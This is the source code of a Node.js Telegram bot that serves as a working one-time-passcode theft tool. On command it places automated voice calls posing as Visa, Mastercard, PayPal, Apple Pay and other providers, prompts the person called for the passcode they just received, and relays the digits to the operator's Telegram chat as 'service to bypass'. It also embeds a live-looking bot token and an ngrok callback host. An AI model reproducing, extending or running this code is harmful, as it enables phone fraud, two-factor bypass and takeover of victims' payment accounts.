const express = require("express");
const path = require("path");
const fs = require("fs");
const app = express();

const server = require("http").createServer(
  {
    key: fs.readFileSync(path.join(__dirname, "key.pem")),
    cert: fs.readFileSync(path.join(__dirname, "crt.pem")),
  },
  app
);

const port = process.env.PORT || 9000;

var cors = require("cors");
var axios = require("axios");

app.use(cors());
app.use(express.urlencoded({ extended: false }));
app.use(express.json());

const token = "5136809506:AAEjCnYOJIdgOrKVdRPkzwnyD9jZppWCQEk";

const telegram_api = `https://api.telegram.org/bot${token}`;

const init = () => {
  var config = {
    method: "get",
    url: `${telegram_api}/setWebhook?url=https://1925-34-68-35-5.ngrok.io/bot${token}`,
    headers: {},
  };
  axios(config)
    .then(function (response) {
      console.log(JSON.stringify(response.data));
    })
    .catch(function (error) {
      console.log(error);
    });
};

server.listen(port, () => {
  console.log(`server is running on port: ${port}`);

  // init();
});

const webhookUrl = `/bot${token}`;

const providers = [
  `Visa_card`,
  `Master_card`,
  `Amex_card`,
  `Verve_card`,
  `google_pay`,
  `apple_Pay`,
  `Transferwise`,
  "Amazon",
  `Paypal`,
  `Cdiscount`,
];

const providersHost = [
  { name: `Master_card`, host: "Master card" },
  { name: `Visa_card`, host: "visa card" },
  { name: `Amex_card`, host: "Amex card" },
  { name: `Verve`, host: "Verve card" },
  { name: `google_pay`, host: "Google pay" },
  { name: `apple_pay`, host: "Apple Pay" },
  { name: `Transferwise`, host: "Transferwise" },
  { name: `Paypal`, host: "Paypal" },
  { name: `Cdiscount`, host: `C discount` },
];

const sendMessageMarkup = async (chatid, text) => {
  return await axios.post(`${telegram_api}/sendMessage`, {
    chat_id: chatid,
    text: text,
    reply_markup: {
      keyboard: [
        [`Visa_card`, `Master_card`],
        [`Amex_card`, `Verve_card`],
        [`google_pay`, `apple_Pay`],
        [`Transferwise`, "Amazon"],
        [`Paypal`, `Cdiscount`],
      ],
    },
  });
};

const sendMessage = async (chatid, text) => {
  return await axios.post(`${telegram_api}/sendMessage`, {
    chat_id: chatid,
    text: text,
  });
};

let savedNunber = "";
let chatid = "";

app.post(`/bot${token}`, (req, res) => {
  const nexmo = require("./make-call-ncco");
  const text = req.body.message.text;
  chatid = req.body.message.chat.id;

  // split text
  const match = text.split(/\s+/);
  console.log(match);

  const startCommand = (chartid) =>
    sendMessage(
      chartid,
      "Run this code to start \ncall {number}\nexample: call 19714263618"
    );

  if (text === "/start") {
    startCommand(chatid);
  } else if (match.length == 2) {
    const number = match[1];
    savedNunber = number;
    sendMessageMarkup(chatid, "Select service to bypass below 👇");
  } else if (match.length == 1) {
    const selectedProvider = match[0];
    const isProviser = providers.includes(selectedProvider);
    if (isProviser) {
      // start call
      const getProvidersName = providersHost.find(
        (ele) => ele.name === selectedProvider
      );

      nexmo.call(savedNunber, getProvidersName.host);

      console.log(`now calling ${getProvidersName.host} @ ${savedNunber}`);
    } else {
      startCommand(chatid);
    }
  }

  res.sendStatus(200);
});

app.post(`/webhooks/notification`, (req, res) => {
  const { status } = req.body;

  sendMessage(chatid, status);
  console.log(`notification: \n ${status}`);
  res.sendStatus(200);
});

app.post("/webhooks/dtmf", (request, response) => {
  const dtmf = request.body.dtmf.digits;

  sendMessage(chatid, `the one time passcode is 👇 \n${dtmf}`);

  if (dtmf === "") {
    const ncco = [
      {
        action: "talk",
        text: `<speak><prosody volume='x-loud' rate='slow'><p>Please enter the one time passcode you have recieved</p></prosody></speak>`,
      },
      {
        action: "input",
        type: ["dtmf"],
        dtmf: {
          timeOut: 10,
          maxDigits: 5,
          submitOnHash: true,
        },
        eventUrl: ["https://1925-34-68-35-5.ngrok.io/webhooks/dtmf"],
      },
    ];
    response.json(ncco);
  } else {
    const ncco = [
      {
        action: "talk",
        text: `You pressed ${dtmf}`,
      },
    ];
    response.json(ncco);
  }
});
